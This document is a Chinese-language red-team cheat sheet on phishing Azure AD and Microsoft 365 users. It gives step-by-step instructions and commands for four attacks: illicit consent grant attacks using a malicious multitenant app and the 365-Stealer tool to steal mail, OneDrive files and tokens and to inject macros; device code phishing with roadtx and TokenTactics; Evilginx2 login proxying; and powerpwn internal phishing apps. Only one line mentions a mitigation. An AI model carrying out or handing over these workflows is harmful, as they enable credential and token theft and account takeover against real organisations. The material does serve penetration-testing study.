# Azure AD - 钓鱼 (Phishing)

## 非法同意授权 (Illicit Consent Grant)

> 攻击者创建一个 Azure 注册应用程序，该程序请求访问敏感数据（如联系信息、电子邮件或文档）。然后，攻击者诱导最终用户向该应用程序授予同意，从而使攻击者能够获得该目标用户所拥有的数据访问权限。

:warning: 既然发布者验证 (publisher verification) 已正式启用，所有 Office 365 用户都将免受此类基于应用的攻击，因为他们“将无法再对 2020 年 11 月 8 日以后注册的来自未验证发布者的多租户应用授予新的同意”。

检查是否允许用户对应用授予同意：`PS AzureADPreview> (GetAzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole`

* **禁用用户同意 (Disable user consent)**：用户无法向应用程序授予权限。
* **用户可以对来自经过验证的发布者或你组织的应用程序授予同意，但仅限于你选择的权限**：所有用户只能对经过验证的发布者发布的应用以及在你租户中注册的应用授予同意。
* **用户可以对所有应用授予同意 (Users can consent to all apps)**：允许所有用户对任何不需要管理员同意的权限进行授权。
* **自定义应用同意策略 (Custom app consent policy)**

### 注册应用程序 (Register Application)

1. 登录 [https://portal.azure.com](https://portal.azure.com) > Azure Active Directory
2. 点击 **应用注册 (App registrations)** > **新注册 (New registration)**
3. 输入应用程序名称
4. 在受支持的账户类型下，选择 **“任何组织目录中的账户（任何 Azure AD 目录 - 多租户）” (Accounts in any organizational directory - Multitenant)**
5. 输入重定向 URL (Redirect URL)。此 URL 应指向我们将用于托管钓鱼页面的 365-Stealer 应用程序。确保端点为 `https://<域名/IP>:<端口>/login/authorized`。
6. 点击 **注册 (Register)** 并保存 **应用程序 (客户端) ID (Application ID)**。

### 配置应用程序 (Configure Application)

1. 点击 **证书和密码 (Certificates & secrets)**。
2. 点击 **新客户端密码 (New client secret)**，输入 **描述 (Description)** 后点击 **添加 (Add)**。
3. 保存该 **密码 (secret)** 的值。
4. 点击 **API 权限 (API permissions)** > **添加权限 (Add a permission)**。
5. 点击 **Microsoft Graph** > **委托权限 (Delegated permissions)**。
6. 搜索并选择以下权限，然后点击 **添加权限**：
    * Contacts.Read
    * Mail.Read / Mail.ReadWrite
    * Mail.ReadBasic
    * Mail.Send
    * Notes.Read.All
    * Mailboxsettings.ReadWrite
    * Files.ReadWrite.All
    * User.ReadBasic.All
    * User.Read

### 设置 365-Stealer (已弃用 / Deprecated)

:warning: 365-Stealer 钓鱼的默认端口为 443。

* 运行 XAMPP 并启动 Apache。
* 将 365-Stealer 克隆到 `C:\xampp\htdocs\`
    * `git clone https://github.com/AlteredSecurity/365-Stealer.git`
* 安装依赖项
    * Python3
    * PHP CLI 或 Xampp 服务器
    * `pip install -r requirements.txt`
* 启用 sqlite3 (Xampp > Apache config > php.ini) 并重启 Apache。
* 如有需要，编辑 `C:/xampp/htdocs/yourvictims/index.php`
    * 禁用 IP 白名单：`$enableIpWhiteList = false;`
* 进入 365-Stealer 管理中心 > 配置 (`http://localhost:82/365-stealer/yourVictims`)
    * **客户端 ID (Client Id)** (必填): 我们注册的应用程序的“应用程序(客户端) ID”。
    * **客户端密码 (Client Secret)** (必填): 我们在“证书和密码”选项卡中创建的密码值。
    * **重定向 URL (Redirect URL)** (必填): 指定我们在注册应用时输入的重定向 URL，如 `https://<域名/IP>/login/authorized`。
    * **宏位置 (Macros Location)**: 我们希望注入的宏文件的路径。
    * **OneDrive 后缀 (Extension in OneDrive)**: 我们可以提供想要从受害者帐户下载的文件后缀，或者提供 `*` 以下载受害者 OneDrive 中的所有文件。文件后缀应以逗号分隔，如 `txt, pdf, docx` 等。
    * **延迟 (Delay)**: 设置窃取时的请求延迟（以秒为单位）。
* 创建自签名证书以使用 HTTPS。
* 运行应用程序，既可以点击按钮，也可以运行以下命令：`python 365-Stealer.py --run-app`
    * `--no-ssl`: 禁用 HTTPS
    * `--port`: 更改默认监听端口
    * `--token`: 提供特定的令牌 (token)
    * `--refresh-token XXX --client-id YYY --client-secret ZZZ`: 使用刷新令牌
* 寻找钓鱼 URL：访问 `https://<IP/域名>:<端口>` 并在控制台或页面中点击 “Read More” 按钮。

### Vajra

> Vajra 是一款基于 UI 的工具，具有多种在目标 Azure 环境中进行攻击和枚举的技术。它采用直观的 Web 界面，使用 Python Flask 模块构建，旨在提供更好的用户体验。该工具的主要重点是将不同的攻击技术整合在一个带有 Web UI 界面的地方。 - [TROUBLE-1/Vajra](https://github.com/TROUBLE-1/Vajra)

**缓解措施**：在“同意和权限”菜单中，为应用程序启用 `不允许用户同意 (Do not allow user consent)`。

### Roadtx

* 在 `roadtx` 中使用授权码流 (authorization code flow) 获取令牌

```ps1
roadtx codeauth -c <app-id> -r msgraph -t <tenant-id> <0.A....> -ru 'https://<phish-app>/redir' -p <app-secret>
```

## 设备代码钓鱼 (Device Code Phishing)

* 使用 roadtool: `roadtx gettokens -u user@domain.lab --device-code`

    ```ps1
    roadtx.exe auth --device-code -c 29d9ed98-a469-4536-ade2-f981bc1d605e
    Requesting token for resource https://graph.windows.net
    To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code XXXXXXXXX to authenticate.
    ```

* 使用 TokenTactics 使用设备代码请求 Azure Graph API 令牌

    ```ps1
    Import-Module .\TokenTactics.psd1
    Get-AzureToken -Client Graph
    ```

* 在 [钓鱼邮件模板](https://github.com/rvrsh3ll/TokenTactics/blob/main/resources/DeviceCodePhishingEmailTemplate.oft) 中替换 `<REPLACE-WITH-DEVCODE-FROM-TOKENTACTICS>`。
* 让 TokenTactics 在 PowerShell 窗口中保持运行，并发送钓鱼邮件。
* 目标用户点击链接访问 [https://microsoft.com/devicelogin](https://microsoft.com/devicelogin) 并填写设备代码。
* 获取你的 **访问令牌 (access token)** 和 **刷新令牌 (refresh token)**。

## 使用 Evilginx2 进行钓鱼 (Phishing with Evilginx2)

* 使用 o365 phishlet 运行 [kgretzky/evilginx2](https://github.com/kgretzky/evilginx2)

    ```powershell
    PS C:\Tools> evilginx2 -p C:\Tools\evilginx2\phishlets
    : config domain username.corp
    : config ip 10.10.10.10
    : phishlets hostname o365 login.username.corp
    : phishlets get-hosts o365
    ```

* 为 `login.login.username.corp` 和 `www.login.username.corp` 创建 A 类型 DNS 记录，并指向你的机器。
* 拷贝证书并启用钓鱼

    ```ps1
    PS C:\Tools> Copy-Item C:\Users\Username\.evilginx\crt\ca.crt C:\Users\Username\.evilginx\crt\login.username.corp\o365.crt
    PS C:\Tools> Copy-Item C:\Users\Username\.evilginx\crt\private.key C:\Users\Username\.evilginx\crt\login.username.corp\o365.key
    : phishlets enable o365

    # 获取钓鱼 URL
    : lures create o365
    : lures get-url 0
    ```

### 内部钓鱼 - Power Platform (Internal Phishing - Power Platform)

> 在微软拥有的域名上建立一个内部钓鱼应用程序，当用户浏览你的链接时，该程序会自动进行身份验证。

* 安装 [mbrg/power-pwn](https://github.com/mbrg/power-pwn) - 一套针对 Microsoft 365 Power Platform 的攻防安全工具集

    ```ps1
    pip install powerpwn
    ```

* 安装应用程序：`powerpwn phishing install-app -t {tenant-id} -e {environment-id} --input {应用程序包 zip 的路径} -n {应用程序名称}`
* 向组织共享应用程序：`powerpwn phishing share-app -t {tenant-id} -e {environment-id} -a {app id}`

## 参考资料 (References)

* [Introduction To 365-Stealer - Understanding and Executing the Illicit Consent Grant Attack](https://www.alteredsecurity.com/post/introduction-to-365-stealer)
* [Learn with @trouble1_raunak: Cloud Pentesting - Azure (Illicit Consent Grant Attack) - trouble1_raunak - Jun 6, 2021](https://www.youtube.com/watch?v=51FSvndgddk&list=WL)
* [The Art of the Device Code Phish - Bobby Cooke - July 12, 2021](https://0xboku.com/2021/07/12/ArtOfDeviceCodePhish.html)
* [Power Pwn - Black Hat Arsenal 2023 - Aug 24, 2023](https://www.youtube.com/watch?v=LpdckZyBwvs)
* [Low Code High Risk - Enterprise Domination via Low Code Abuse - Defcon 30 - Oct 20, 2022](https://www.youtube.com/watch?v=D3A62Rzozq4)
* [Training - Attacking and Defending Azure Lab - Altered Security](https://www.alteredsecurity.com/azureadlab)
